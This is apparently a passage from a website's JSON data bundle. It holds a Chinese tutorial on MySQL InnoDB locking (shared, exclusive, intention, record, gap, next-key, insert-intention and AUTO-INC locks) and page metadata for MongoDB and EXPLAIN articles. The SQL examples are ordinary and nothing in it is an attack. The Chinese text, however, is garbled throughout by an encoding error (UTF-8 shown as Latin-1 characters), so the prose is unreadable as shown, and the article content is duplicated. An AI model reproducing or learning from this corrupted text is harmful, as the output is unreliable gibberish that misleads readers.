éåç§°ä¸ºèªå¢éï¼ç®ç§° AI éï¼ãå®æ¯ç¹æ®çè¡¨éï¼å¨æå¥æ°æ®å°å·æ AUTO_INCREMENT åçè¡¨æ¶ä½¿ç¨ãå½æå¥æ°æ®çè¡¨ä¸­æèªå¢åæ¶ï¼æ°æ®åºéè¦èªå¨çæèªå¢å¼ï¼å¨çæä¹åï¼å®ä¼åè·åå°ç¸å³è¡¨ç AUTO-INC éãå¶ä»äºå¡çæå¥æä½å°ä¼è¢«é»å¡ï¼è¿æ ·å¯ä»¥ä¿è¯èªå¢å¼çå¯ä¸æ§ã\n\nAUTO-INC éå·æå¦ä¸ç¹ç¹ï¼\n\n * æ¯ä¸å¼ è¡¨é½å·æå®èªå·±ç AUTO-INC éï¼äºç¸ä¹é´ä¸å¼å®¹ã\n * ä¸éµå¾ªäºæ®µéåè®®ï¼å®å¹¶ä¸æ¯å¨äºå¡æäº¤æ¶éæ¾ï¼èæ¯å¨ insert è¯­å¥æ§è¡å®æä¹åå°±éæ¾ï¼æé«äºå¹¶åæå¥çæ§è½ã\n * èªå¢å¼ä¸æ¦åéäºå°±ä¼å ä¸ï¼å³ä½¿åæ»äºï¼èªå¢å¼ä¹ä¸ä¼åä¸ï¼èæ¯ç»§ç»­ä½¿ç¨ä¸ä¸ä¸ªå¼ï¼æä»¥èªå¢å¼æå¯è½ä¸æ¯è¿ç»­çã\n\nå ä¸ºå¨æå¥æ¶ä¼ä½¿ç¨å°è¯¥è¡¨éï¼æä»¥å¿ç¶ä¼é æå¹¶åæå¥æ§è½çä¸éãå æ­¤ InooDB æä¾äºä¸ä¸ª innodb_autoinc_lock_mode éç½®é¡¹ç¨äºæ§å¶èªå¢éçç®æ³ï¼è¯¥éç½®é¡¹å¯ä»¥ä½¿ç¨æ·éæ©å¦ä½å¨å¯é¢æµçèªå¨å¢éå¼åºåä¸æå¥æä½çæå¤§å¹¶åæ§ä¹é´è¿è¡æè¡¡ã\n\nè¯¥éç½®æä¸ä¸ªå¯éé¡¹ï¼\n\n * 0ï¼ä½¿ç¨ä¼ ç»çéå®æ¨¡å¼ï¼å¹¶åæ§è½æå·®ã\n * 1ï¼é»è®¤éç¨çæ¨¡å¼ã\n * 2ï¼å¹¶åæ§è½æé«ï¼ä½æ¯ä¸è½ä¿è¯åä¸æ¡ insert è¯­å¥åçèªå¢å¼æ¯è¿ç»­çã\n\næ³è¦äºè§£æ´å¤å³äºæ­¤éç½®çåå®¹å¯ä»¥æ¥ç MySQL çè¿ç¯ææ¡£ã\n\n\n# æ»ç»\n\nInnoDB çåç§è¡éçå¼å®¹æ§ï¼å¦ä¸è¡¨æç¤ºï¼\n\n\n\nnoteï¼ ç¬¬ä¸åè¡¨ç¤ºå·²ç»ææçéï¼ç¬¬ä¸è¡è¡¨ç¤ºè¦è·åçéã\n\nä»è¡¨ä¸­å¯ä»¥å¾åºç»è®ºï¼\n\n * æå¥æåéä¸å½±åå¶ä»äºå¡è·åå¶ä»çéã\n * æå¥æåéä¼åå° Gap éå Next-Key éçå½±åãä¸ä¸ªäºå¡æ³è¦è·åæå®é´éçæå¥æåéï¼é£ä¹è¯¥é´éä¸­ç Gap éå Next-Key éå¿é¡»æ²¡æè¢«å¶ä»äºå¡ææï¼å¦åï¼å°ä¼è¢«é»å¡ã\n\nå¦æï¼æä»¬é¤å»æå¥æåéçå½±åï¼é£ä¹å¼å®¹æ§è¡¨æ ¼å¦ä¸ï¼\n\n\n\nä»è¡¨ä¸­æä»¬å¯ä»¥å¾åºä»¥ä¸ç»è®ºï¼\n\n * å½ä¸¤ä¸ªäºå¡çéé½æ¶åå°è®°å½éï¼é£ä¹å°ä¼å²çªã\n * é´ééä¸å¶ä»éï¼ä¸åæ¬æå¥æåéï¼é½ä¸ä¼äº§çå²çªã",normalizedContent:"# åè¨\n\néæ¯å¨å¹¶åç¨åºä¸­æç»å¸¸ä½¿ç¨çææ®µä¹ä¸ï¼ä½æ¯éçæ»¥ç¨ä¹ä¼ç»ç¨åºçæ§è½å¸¦æ¥æå¤§çè´æãèæä»¬å¹³æ¶ä½¿ç¨ mysql åå¢å æ¹æ¥æä½çæ¶åï¼æè§ä¸å°æä»¬æå¨ä½¿ç¨éï¼å®éä¸æ¯å ä¸º mysql å·²ç»ä¸ºæä»¬ä½¿ç¨äºç¸å³çéãå¦æä½ æ³ç¥éæä»¬å¹³æ¶ä½¿ç¨ç sql è¯­å¥é½ä½¿ç¨äºåªäºéï¼é½æ¯æä¹å éçï¼è¿äºéçä½ç¨æ¯ä»ä¹ï¼é£ä¹å¯ä»¥ç»§ç»­å¾ä¸çã\n\n\n\n\n# æ®éé\n\ninnodb å®ç°äºæ åè¡çº§éï¼èè¡çº§éæä¸¤ç§ç±»åï¼\n\n * å±äº«éï¼shared lockï¼ä»¥ä¸å°ä¼ç®ç§°ä¸º s éï¼ï¼æå¨å±äº«ãä¹å°±æ¯åè®¸å¤ä¸ªäºå¡å±åææä¸ä¸ªè®°å½çå±äº«éï¼è¯¥éä¸»è¦ç¨äºè¯»åæä½ã\n * æä»éï¼exclusive lockï¼ä»¥ä¸å°ä¼ç®ç§°ä¸º x éï¼ï¼æå¨ææ¥ãåªè½åè®¸ä¸ä¸ªäºå¡ææä¸ä¸ªè®°å½çæä»éï¼è¯¥éä¸»è¦ç¨äºæ´æ°åå é¤æä½ã\n   å¦æä½ æäºè§£è¿ java ä¸­ç juc åï¼é£ä¹ä½ å°±ä¼åç°è¿æç¹å juc ä¸­çè¯»åé reentrantreadwritelockãå®ä»¬çç®çé½æ¯ä¸ºäºæé«è¯»åæä½çå¹¶åæ§ã\n\nå¦ææä¸ä¸ªäºå¡ t1 ææè¡ r ç s éï¼å¹¶ä¸åæ¶æå¦ä¸ä¸ªäºå¡ t2 æ³è¦è·åè¡ r ä¸­çéï¼t2 è·åä¸åçéå°ä¼æå¦ä¸çæåµåçï¼\n\nåå¦ t2 æ³è¦è·åè¡ r ç s éï¼é£ä¹ t2 å°ä¼ç«å»å¾å°è¯¥éã\nåå¦ t2 æ³è¦è·åè¡ r ç x éï¼é£ä¹ t2 åä¼è¢«é»å¡ï¼ç´å° t1 éæ¾äºè¡ r ç s éã\nå¦ææä¸ä¸ªäºå¡ t1 æææ§ r ç x éï¼å¹¶ä¸åæ¶æå¦ä¸ä¸ªäºå¡ t2 æ³è¦è·åè¡ r ä¸­çéï¼ä¸ç®¡ t2 è·åä»ä¹éé½ä¼è¢«é»å¡ã\n\nx éä¸ s éçå¼å®¹æ§å¦ä¸å¾æç¤ºï¼\n\n\n\næå·¦è¾¹æ¯ææçéï¼æä¸é¢æ¯æ³è¦ç³è¯·çéãä»å¾ä¸­å¯ä»¥çåºï¼åªè¦è· x éç¸å³çï¼é½ä¼å²çªï¼ä¹å°±æ¯ä¼é æé»å¡ã\n\n\n# æåé\n\ninnodb åè®¸å¤ç§ç²åº¦çéå±å­ï¼æä»¥ä¼æè¡¨éåè¡éå±å­çæåµãä¸ºäºè®©å¤ç§ç²åº¦çéå¯ä»¥å±å­ï¼innodb ä½¿ç¨äºæåéãæåéæ¯è¡¨çº§éï¼å®æ¯ä¸ºäºè¡¨ææä¸ä¸ªäºå¡æ­£å¨ææéæèæç®ç³è¯·ä¸ä¸ªéã\n\næåéæä¸¤ç§ç±»åï¼\n\n * å±äº«æåéï¼intention shared lockï¼ä»¥ä¸ç®ç§° isï¼ï¼è¡¨ç¤ºäºå¡ææè¡¨ä¸­è¡çå±äº«éæèæç®è·åè¡çå±äº«éã\n * å±äº«æä»éï¼intention exclusive lockï¼ä»¥ä¸ç®ç§° ixï¼ï¼è¡¨ç¤ºäºå¡ææè¡¨ä¸­è¡çæä»éæèæç®è·åè¡çæä»éã\n   is å ix åªæ¯ä¸ºäºè¡¨è¾¾åºä¸ç§æå¾ï¼å®ä»¬é¤äºå¨è¡¨è¯·æ±ä¹å¤ï¼ä¸ä¼é»å¡ä»»ä½æä½ãå®ä»¬çä¸»è¦ç®çåªæ¯ä¸ºäºè¡¨ç¤ºææä¸ä¸ªè¡éï¼æèæç®è·åè¡éã\n\næåéçä½¿ç¨è§åå¦ä¸ï¼\n\n * äºå¡å¨è·åè¡¨ä¸­çå±äº«è¡éæ¶ï¼éè¦åè·åè¡¨ä¸­ç is éæèç­çº§æ´é«çéã\n * äºå¡å¨è·åè¡¨ä¸­çæä»è¡éæ¶ï¼éè¦åè·åè¡¨ä¸­ç ix éã\n\nè¿éæä¸ä¸ªå¾éè¦çç¹ï¼å°±æ¯åªæè·åè¡¨ä¸­çè¡éæ¶ï¼æä¼éè¦åç³è¯·æåéã å¦ææ¯æ§è¡ alter table ç­éè¦éå®æ´ä¸ªè¡¨çè¯­å¥ï¼æ¯ä¸éè¦ç³è¯·æåéçï¼å¯ä»¥ç´æ¥å»ç³è¯·è¡¨çº§ x éã\n\nè¡¨çº§å«ä¸ç x éãs éãis éå ix éçå¼å®¹æ§å¦ä¸ï¼\n\n\n\n\n# æ³¨æï¼è¿éç x éãs éè¯´çä¹æ¯è¡¨çº§éï¼ä¸è¦çæå½ç¶çæ³æäºè¡çº§éã\n\nä¸ºä»ä¹ä¼ææåéçåºç°å¢ï¼æä»¬èèå¦ä¸åºæ¯ï¼åè®¾ä¸å­å¨æåéï¼ï¼\nä¸ä¸ªäºå¡ a æ³è¦ä¿®æ¹è¡¨ t ä¸­çè¡ rï¼æä»¥ a è·åè¡ r ç x éï¼äº r å¡ a ç°å¨ææä¸ä¸ªè¡éãæ­¤æ¶ï¼æä¸ä¸ªäºå¡ b æ³è¦ä½¿ç¨ alter table è¯­å¥ä¿®æ¹è¡¨ t çç»æï¼è¯¥è¯­å¥é¦åéè¦è·åè¡¨ t ç x éï¼ä½æ¯æ­¤æ¶äºå¡ b å¹¶ä¸ç¥éè¡¨ä¸­æ¯å¦æè¡è¢«éä½ï¼æä»¥å®åªè½ä¸è¡ä¸è¡å»éåï¼ç¶åæéåçè¡ä¹éä½ï¼ç´å°åç°è¡¨ä¸­æ²¡æè¡å¨ä¹åå·²ç»è¢«éä½ï¼ç°å¨å®å°±å¯ä»¥ä¿®æ¹è¡¨çç»æäºãä½æ¯å®åç°è¡¨ä¸­å·²ç»å­å¨ä¸äºè¡è¢«éä½ï¼é£ä¹å®å°±ä¸è½ä¿®æ¹è¡¨ç»æï¼éè¦ç­è¿äºéé½éæ¾ã\n\n\n\nè¿éæä¸ä¸ªå¤§é®é¢ï¼æåçæåµä¸ï¼éè¦éåææçè¡æè½ç¥éæ¯å¦æè¡è¢«éä½ï¼è¿æ¯éå¸¸æ¶èæ§è½çï¼èæåéå°±å¯ä»¥è§£å³è¿ä¸ªé®é¢ãæä»¬ç°å¨åæ¥èèç¸ååºæ¯ä¸ï¼æåéå¦ä½è§£å³è¿ä¸ªé®é¢ï¼\n\nä¸ä¸ªäºå¡ a æ³è¦ä¿®æ¹è¡¨ t ä¸­çè¡ rï¼a é¦åéè¦è·åè¡¨ t ç ix éï¼ç¶åæåè·å ix éä¹åï¼åå»ç³è¯·è¡ r ç x éï¼ç³è¯·æåä¹åï¼äºå¡ a æ­¤æ¶å°±ææä¸¤ä¸ªéï¼åå«æ¯è¡¨ t ç ix éåè¡ r ç x éãæ­¤æ¶ï¼æä¸ä¸ªäºå¡ b æ³è¦ä½¿ç¨ alter table è¯­å¥ä¿®æ¹è¡¨ t çç»æï¼è¯¥è¯­å¥éè¦è·åè¡¨ t ç x éï¼äºå¡ b å¯ä»¥æ¥çè¡¨ t ä¸æ¯å¦å­å¨éæ¥å¤æ­è¡¨ä¸­çè¡æ¯å¦è¢«ä¸éï¼å½åç°è¡¨ t ä¸å­å¨ ix éï¼äºå¡ b å°±ä¼è¢«é»å¡ï¼å ä¸ºå®ç¥éè¡¨ä¸­å·²ç»æè¡è¢«éå®ï¼æä»¥æ æ³ç³è¯·å°è¡¨ t ç x éã\n\n\n\næä»¬çä¸é¢çå¼å®¹æ§è¡¨ï¼ä¹å¾ç¥è¡¨çº§ç ix éåè¡¨çº§ç x éæ¯å²çªçï¼æä»¥ååå¥½å¯¹åºä¸è¿ä¸ªåºæ¯ã\n\n\n# è®°å½é\n\nè®°å½éæ¯å¯¹ç´¢å¼è®°å½çéå®ï¼æ¢å¥è¯è¯´å°±æ¯ï¼è®°å½éåªä¼éå®ç´¢å¼ãæ¯ä¸ä¸ªè¡¨å¿å®ä¼æä¸ä¸ªä¸»é®ç´¢å¼ï¼ç¨æ·å®ä¹çä¸»é®ãå¯ä¸ç´¢å¼ãéå¼çæï¼ï¼èè¯¥ä¸»é®ç´¢å¼ä¸­çéå¶å­èç¹ä¸­çè®°å½å°±æ¯ä½¿ç¨è¯¥è®°å½éè¿è¡éå®ã\n\nåè®¾æ§è¡è¯­å¥ï¼select * from user where id = 10 for update;\n\nå¦æ id æ¯ user è¡¨ä¸­çä¸»é®ï¼é£ä¹å¨ä¸»é®ç´¢å¼ä¸­ï¼id ä¸º 10 çè®°å½å°±ä¼è¢«éå®ãå¹¶ä¸å¶ä»äºå¡æ³è¦æ´æ°ãå é¤æ­¤æ¡è®°å½é½ä¼è¢«é»å¡ï¼åªæç­è¯¥è®°å½ä¸­çè®°å½éè¢«éæ¾ä¹åï¼æå¯ä»¥æ§è¡å¶ä»æä½ã\n\n\n\né¤äºä¸»é®ç´¢å¼ä¹å¤ï¼innodb ä¸­è¿ä¼æäºçº§ç´¢å¼ãäºçº§ç´¢å¼è·ä¸»é®ç´¢å¼ä¸æ ·ï¼å¨ä½¿ç¨äºçº§ç´¢å¼ä½ä¸ºæ¥è¯¢æ¡ä»¶æ¶ï¼ä¼å°ç¬¦åæ¡ä»¶çäºçº§ç´¢å¼çè®°å½ä½¿ç¨è®°å½éè¿è¡éå®ï¼ç¶åååè¡¨å°å¯¹åºçä¸»é®ç´¢å¼ä¹ä½¿ç¨è®°å½éè¿è¡éå®ã\n\nåè®¾æ§è¡è¯­å¥ï¼select * from user where name = 'c' for update;\n\nå¦æ id æ¯ user è¡¨ä¸­çä¸»é®ï¼name æ¯ user è¡¨ä¸­çäºçº§ç´¢å¼ãåä¼åå°äºçº§ç´¢å¼ä¸ç name = âcâ çç´¢å¼éå®ï¼ç¶ååè¿è¡åè¡¨å°ä¸»é®ç´¢å¼ä¸º 9 çä¸»é®ç´¢å¼éå®ã\n\n\n\n\n# é´éé\n\né´ééï¼ç®ç§°ä¸º gapï¼æ¯å¯¹ç´¢å¼è®°å½ä¹é´çé´éçéå®ï¼æèæ¯å¯¹ç¬¬ä¸æ¡ç´¢å¼è®°å½ä¹åçé´éåå¯¹æåä¸æ¡è®°å½ä¹åçé´éçéãé´ééæ¯é²æ­¢å¹»è¯»çä¸»è¦ææ®µä¹ä¸ï¼å¹»è¯»æ¯åä¸ä¸ªäºå¡å¨ä¸åçæ¶é´æ§è¡ç¸åçæ¥è¯¢è¯­å¥ï¼å¾åºçç»æéä¸åãé£ä¹é´ééæ¯å¦ä½é²æ­¢å¹»è¯»çå¢ï¼å®éä¸å°±æ¯éè¿éå®æå®çé´éï¼ä½¿å¾è¿äºé´éæ æ³æå¥æ°çè®°å½ï¼ä»èé²æ­¢äºæ°æ®çå¢é¿ã\n\nåè®¾æä»¬æ§è¡æ­¤æ¡è¯­å¥ï¼select * from user where id > 5 and id < 9 for update;\n\nç±äºé´ééçå­å¨ï¼å¶ä»äºå¡å¦ææ³è¦æå¥ id å¨ 5 å 9 ä¹é´çè®°å½æ¯æ æ³æåçï¼ä¼è¢«é»å¡ï¼ç´å°é´éééæ¾ãæ¯å¦æ³è¦æå¥ id ä¸º 6 çè®°å½ï¼å°±ä¼é»å¡ï¼å¦ä¸å¾æç¤ºï¼çç¥é¨åæ å³çå­æ®µï¼ãé´ééè·¨è¶çé´éå¯è½ä¸ºä¸ä¸ªå¼ãå¤ä¸ªå¼ãçè³ä¸ºç©ºå¼ã\n\n\n\néè¿ä¸å¾æä»¬å¯ä»¥ç¥éï¼\n\n * (5, 7]ï¼id ä¸º 5 çç´¢å¼è®°å½ä¸ id ä¸º 7 çç´¢å¼è®°å½ä¹é´çé´éè¢«é´éééå®äº\n * (7, 9]ï¼id ä¸º 7 çç´¢å¼è®°å½ä¸ id ä¸º 9 çç´¢å¼è®°å½ä¹é´çé´éè¢«é´éééå®äº\n\nå ä¸ºè¿ä¸¤ä¸ªé´éè¢«é´éééå®äºï¼æä»¥å¨è¿ä¸¤ä¸ªé´éä¹é´çè®°å½æ¯æ æ³æå¥ï¼åªæç­é´éééæ¾ä¹åæå¯ä»¥æå¥ãæä»¬è¿è¦æ³¨æå°ï¼id ä¸º 7 çè®°å½æ¯è¢«è®°å½ééå®çï¼æä»¥å¨ id ä¸º 7 çè®°å½ä¸æ§è¡æ´æ°ãå é¤æä½æ¶ä¼è¢«é»å¡çã\n\næä»¬ä¸é¢è¿è¯´å°ï¼é´ééè¿å¨ç¬¬ä¸æ¡è®°å½çåé¢åæåä¸æ¡è®°å½çåé¢å éï¼æä»¬æ¥ççè¿æ¯ä»ä¹æåµã\n\nåè®¾æä»¬æ§è¡æ­¤æ¡è¯­å¥ï¼select * from user for update;\n\nå ä¸ºè¯¥è¯­å¥æ²¡æä½¿ç¨ç´¢å¼ï¼æä»¥ä¼è¿è¡å¨è¡¨æ«æãå°æ«æå°çæ¯ä¸æ¡è®°å½é½å ä¸è®°å½éï¼å¹¶ä¸å°ææçé´éä¹å é´ééãæç»çå éæåµå¦ä¸å¾æç¤ºï¼çç¥é¨åæ å³çå­æ®µï¼ï¼\n\n\n\næ¯ä¸ªè¡¨ä¸­é½ä¼å­å¨ä¸¤ä¸ªéå¼è®°å½ï¼æå°è®°å½ï¼infimumï¼ï¼æå¤§è®°å½ï¼supermumï¼\n\næä»¬éè¿ä¸å¾ï¼å¯ä»¥å¾åºéå®çåºé´å¦ä¸ï¼\n\n * (-â, 5]\n * (5, 7]\n * (7, 9]\n * (9, 10]\n * (10, 12]\n * (12, +â)\n\nå¹¶ä¸ææçè®°å½é½è¢«è®°å½ééå®ãè¿ä¸ªçèµ·æ¥å°±åæ¯ä¸ä¸ªè¡¨éï¼å ä¸ºå¯¹è¯¥è¡¨çä»»ä½æä½ï¼å¿«ç§è¯»é¤å¤ï¼ï¼é½ä¼è¢«é»å¡ã\n\nä½æ¯ï¼é´ééå¹¶ä¸æ¯å¨ä»»ä½æåµä¸é½ä¼ä½¿ç¨ï¼å®å¨ä»¥ä¸æåµå¹¶ä¸ä¼ä½¿ç¨ï¼\n\n * éç¦»çº§å«ä¸º rcãruã\n * ä½¿ç¨å¯ä¸ç´¢å¼è¿è¡ç­å¼æ¯è¾è·åä¸æ¡ç´¢å¼è®°å½ãè¿æ¯å ä¸ºå¯ä¸ç´¢å¼è¿è¡ç­å¼æ¯è¾åªè½è·åä¸æ¡è®°å½ï¼ä¸ä¼åºç°å¤æ¡è®°å½çæåµï¼é£ä¹ä¹å°±ä¸ä¼åºç°å¤æ¬¡è¯»ååºç°ä¸ä¸è´çæåµã\n\né´ééçä¸»è¦ç®çæ¯é»æ­¢äºå¡å¾é´éä¸­æå¥è®°å½ï¼å¹¶ä¸é´ééä¹é´æ¯å¯ä»¥å±å­çï¼å¤ä¸ªäºå¡å¯ä»¥åæ¶è·åå¾å°ç¸åé´éçéãå±äº«é´ééåæä»é´ééä¹é´å¹¶æ²¡æåºå«ï¼å®ä»¬æ¯å®å¨ä¸æ ·çä¸è¥¿ã\n\n\n# next-key é\n\nnext-key éå¹¶ä¸æ¯ä¸ä¸ªé¾ä»¥çè§£çä¸è¥¿ï¼å®æ¬è´¨ä¸å°±æ¯ç´¢å¼è®°å½ä¸çè®°å½éåç´¢å¼è®°å½ä¹é´çé´ééçç»åã\n\ninnodb å¨æ¥æ¾åæ«æè¡¨çæ¶åï¼ä¼å°æ«æå°çè®°å½é½å ä¸è®°å½éï¼è®°å½éæå¯è½æ¯å±äº«éæèæ¯æä»éãå æ­¤ï¼è¡çº§éå®éä¸æ¯ç´¢å¼è®°å½éã\n\nå¨é´ééçä¸¤ä¸ªä¾å­ä¸­çç¬¬äºä¸ªä¾å­ï¼å®å®éä¸å°±æ¯ next-key éï¼å ä¸ºæ¯ä¸ä¸ªæ¬å·æ¬èµ·æ¥çåå­åæ¬ä¸ä¸ªç´¢å¼è®°å½éåä¸ä¸ªé´ééï¼è è¿å®ç¾ç¬¦å next-key çå®ä¹ã\n\n\n# å¨é»è®¤ç repeatable read éç¦»çº§å«ä¸ï¼innodb å¨æ¥æ¾åæ«æç´¢å¼æ¶ï¼é½ä¼ä½¿ç¨ next-key éï¼ä»¥æ­¤æ¥é²æ­¢å¹»è¯»çåçã\n\n\n# æå¥æåé\n\næå¥æåéï¼ç®ç§°ä¸º ii gapï¼æ¯ä¸ç§ç¹æ®çé´ééï¼åªæå¨æå¥è®°å½çæ¶åæä¼ä½¿ç¨ï¼è¿ä¸ªéè¡¨ç¤ºæå¥çæåãå®ä¸ä¸é¢è¯´å°çè¡¨çº§æåéæ¯å®å¨ä¸åçï¼æå¥æåéæ¯å±äºè¡çº§éï¼å¹¶ä¸äºç¸ä¹é´æ¯å¼å®¹çï¼äºä¸å²çªï¼æä»¥å¤ä¸ªäºå¡å¯ä»¥åæ¶è·åå°ç¸åé´éç ii gap éã\n\n> å®æ¹ç¤ºä¾ï¼\n> åè®¾æç´¢å¼è®°å½ï¼å¶å¼åå«ä¸º 4 å 7ï¼åç¬çäºå¡åå«å°è¯æå¥å¼ 5 å 6ï¼å¨è·å¾æå¥è¡çæä»éä¹åï¼æ¯ä¸ªäºå¡é½ä½¿ç¨æå¥æå¾éæ¥éå® 4 å 7 ä¹é´çé´éï¼ä½ä¸è¦äºç¸é»å¡ï¼å ä¸ºè¡æ¯æ å²çªçã\n\næå¥æåéåªä¼åé´ééå next-key éå²çªãå ä¸ºé´ééçä¸»è¦ä½ç¨æ¯é²æ­¢å¹»è¯»çåçï¼èå¨æå¥æä½æ§è¡åéè¦è·åå°æå¥æåéï¼èæå¥æåéåé´ééä¹é´æ¯å²çªçï¼å¯ä»¥é»å¡æå¥æä½ï¼æä»¥é´ééå¯ä»¥é²æ­¢å¹»è¯»çåçã\n\n\n# auto-inc é\n\nauto-inc éåç§°ä¸ºèªå¢éï¼ç®ç§° ai éï¼ãå®æ¯ç¹æ®çè¡¨éï¼å¨æå¥æ°æ®å°å·æ auto_increment åçè¡¨æ¶ä½¿ç¨ãå½æå¥æ°æ®çè¡¨ä¸­æèªå¢åæ¶ï¼æ°æ®åºéè¦èªå¨çæèªå¢å¼ï¼å¨çæä¹åï¼å®ä¼åè·åå°ç¸å³è¡¨ç auto-inc éãå¶ä»äºå¡çæå¥æä½å°ä¼è¢«é»å¡ï¼è¿æ ·å¯ä»¥ä¿è¯èªå¢å¼çå¯ä¸æ§ã\n\nauto-inc éå·æå¦ä¸ç¹ç¹ï¼\n\n * æ¯ä¸å¼ è¡¨é½å·æå®èªå·±ç auto-inc éï¼äºç¸ä¹é´ä¸å¼å®¹ã\n * ä¸éµå¾ªäºæ®µéåè®®ï¼å®å¹¶ä¸æ¯å¨äºå¡æäº¤æ¶éæ¾ï¼èæ¯å¨ insert è¯­å¥æ§è¡å®æä¹åå°±éæ¾ï¼æé«äºå¹¶åæå¥çæ§è½ã\n * èªå¢å¼ä¸æ¦åéäºå°±ä¼å ä¸ï¼å³ä½¿åæ»äºï¼èªå¢å¼ä¹ä¸ä¼åä¸ï¼èæ¯ç»§ç»­ä½¿ç¨ä¸ä¸ä¸ªå¼ï¼æä»¥èªå¢å¼æå¯è½ä¸æ¯è¿ç»­çã\n\nå ä¸ºå¨æå¥æ¶ä¼ä½¿ç¨å°è¯¥è¡¨éï¼æä»¥å¿ç¶ä¼é æå¹¶åæå¥æ§è½çä¸éãå æ­¤ inoodb æä¾äºä¸ä¸ª innodb_autoinc_lock_mode éç½®é¡¹ç¨äºæ§å¶èªå¢éçç®æ³ï¼è¯¥éç½®é¡¹å¯ä»¥ä½¿ç¨æ·éæ©å¦ä½å¨å¯é¢æµçèªå¨å¢éå¼åºåä¸æå¥æä½çæå¤§å¹¶åæ§ä¹é´è¿è¡æè¡¡ã\n\nè¯¥éç½®æä¸ä¸ªå¯éé¡¹ï¼\n\n * 0ï¼ä½¿ç¨ä¼ ç»çéå®æ¨¡å¼ï¼å¹¶åæ§è½æå·®ã\n * 1ï¼é»è®¤éç¨çæ¨¡å¼ã\n * 2ï¼å¹¶åæ§è½æé«ï¼ä½æ¯ä¸è½ä¿è¯åä¸æ¡ insert è¯­å¥åçèªå¢å¼æ¯è¿ç»­çã\n\næ³è¦äºè§£æ´å¤å³äºæ­¤éç½®çåå®¹å¯ä»¥æ¥ç mysql çè¿ç¯ææ¡£ã\n\n\n# æ»ç»\n\ninnodb çåç§è¡éçå¼å®¹æ§ï¼å¦ä¸è¡¨æç¤ºï¼\n\n\n\nnoteï¼ ç¬¬ä¸åè¡¨ç¤ºå·²ç»ææçéï¼ç¬¬ä¸è¡è¡¨ç¤ºè¦è·åçéã\n\nä»è¡¨ä¸­å¯ä»¥å¾åºç»è®ºï¼\n\n * æå¥æåéä¸å½±åå¶ä»äºå¡è·åå¶ä»çéã\n * æå¥æåéä¼åå° gap éå next-key éçå½±åãä¸ä¸ªäºå¡æ³è¦è·åæå®é´éçæå¥æåéï¼é£ä¹è¯¥é´éä¸­ç gap éå next-key éå¿é¡»æ²¡æè¢«å¶ä»äºå¡ææï¼å¦åï¼å°ä¼è¢«é»å¡ã\n\nå¦æï¼æä»¬é¤å»æå¥æåéçå½±åï¼é£ä¹å¼å®¹æ§è¡¨æ ¼å¦ä¸ï¼\n\n\n\nä»è¡¨ä¸­æä»¬å¯ä»¥å¾åºä»¥ä¸ç»è®ºï¼\n\n * å½ä¸¤ä¸ªäºå¡çéé½æ¶åå°è®°å½éï¼é£ä¹å°ä¼å²çªã\n * é´ééä¸å¶ä»éï¼ä¸åæ¬æå¥æåéï¼é½ä¸ä¼äº§çå²çªã",charsets:{cjk:!0}},{title:"mongodb",frontmatter:{title:"mongodb",date:"2023-06-25T09:22:36.000Z",permalink:"/mongodb/1800/",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/05.mongodb/1800.mongodb.html",relativePath:"03.å¤§æ°æ®/05.mongodb/1800.mongodb.md",key:"v-8194159c",path:"/mongodb/1800/",lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:null,content:"",normalizedContent:"",charsets:{}},{title:"MySQL ç´¢å¼ä¼åå·¥å· explain",frontmatter:{title:"MySQL ç´¢å¼ä¼åå·¥å· explain",date:"2023-06-25T09:22:36.000Z",permalink:"/mysql/1302",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/03.%E5%A4%A7%E6%95%B0%E6%8D%AE/04.mysql/1302.MySQL%20%E7%B4%A2%E5%BC%95%E4%BC%98%E5%8C%96%E5%B7%A5%E5%85%B7%20explain.html",relativePath:"03.å¤§æ°æ®/04.mysql/1302.MySQL ç´¢å¼ä¼åå·¥å· explain.md",key:"v-4993606a",path:"/mysql/1302/",headers:[{level:2,title:"Explain ç¨æ³",slug:"explain-ç¨æ³",normalizedTitle:"explain ç¨æ³",charIndex:2},{level:2,title:"id",slug:"id",normalizedTitle:"id",charIndex:175},{level:2,title:"select_type",slug:"select-type",normalizedTitle:"select_type",charIndex:305},{level:2,title:"table",slug:"table",normalizedTitle:"table",charIndex:718},{level:2,title:"type",slug:"type",normalizedTitle:"type",charIndex:312},{level:2,title:"possible_keys",slug:"possible-keys",normalizedTitle:"possible_keys",charIndex:1359},{level:2,title:"Key",slug:"key",normalizedTitle:"key",charIndex:1428},{level:2,title:"key_len",slug:"key-len",normalizedTitle:"key_len",charIndex:1586},{level:2,title:"ref",slug:"ref",normalizedTitle:"ref",charIndex:820},{level:2,title:"rows",slug:"rows",normalizedTitle:"rows",charIndex:1932},{level:2,title:"extra",slug:"extra",normalizedTitle:"extra",charIndex:1989},{level:3,title:"using fileSortï¼éç¹ä¼åï¼",slug:"using-filesort-éç¹ä¼å",normalizedTitle:"using filesortï¼éç¹ä¼åï¼",charIndex:2025},{level:3,title:"using temporaryï¼éç¹ä¼åï¼",slug:"using-temporary-éç¹ä¼å",normalizedTitle:"using temporaryï¼éç¹ä¼åï¼",charIndex:2225},{level:3,title:"USING indexï¼éç¹ï¼",slug:"using-index-éç¹",normalizedTitle:"using indexï¼éç¹ï¼",charIndex:2294},{level:3,title:"Using wher",slug:"using-wher",normalizedTitle:"using wher",charIndex:2451},{level:3,title:"using join buffer",slug:"using-join-buffer",normalizedTitle:"using join buffer",charIndex:2482},{level:3,title:"impossible where",slug:"impossible-where",normalizedTitle:"impossible where",charIndex:2513},{level:3,title:"select tables optimized away",slug:"select-tables-optimized-away",normalizedTitle:"select tables optimized away",charIndex:2565},{level:3,title:"distinct",slug:"distinct",normalizedTitle:"distinct",charIndex:2701}],lastUpdated:"12/24/2024, 6:15:06 PM",lastUpdatedTimestamp:1735035306e3,headersStr:"Explain ç¨æ³ id select_type table type possible_keys Key key_len ref rows extra using fileSortï¼éç¹ä¼åï¼ using temporaryï¼éç¹ä¼åï¼ USING indexï¼éç¹ï¼ Using wher using join buffer impossible where select tables optimized away distinct",content:"# Explain ç¨æ³\n\næ¨¡æ Mysql ä¼åå¨æ¯å¦ä½æ§è¡ SQL æ¥è¯¢è¯­å¥çï¼ä»èç¥é Mysql æ¯å¦ä½å¤çä½ ç SQL è¯­å¥çãåæä½ çæ¥è¯¢è¯­å¥ææ¯è¡¨ç»æçæ§è½ç¶é¢ã\nè¯­æ³ï¼Explain + SQL è¯­å¥ï¼\nå¦ï¼Explain select * from user; 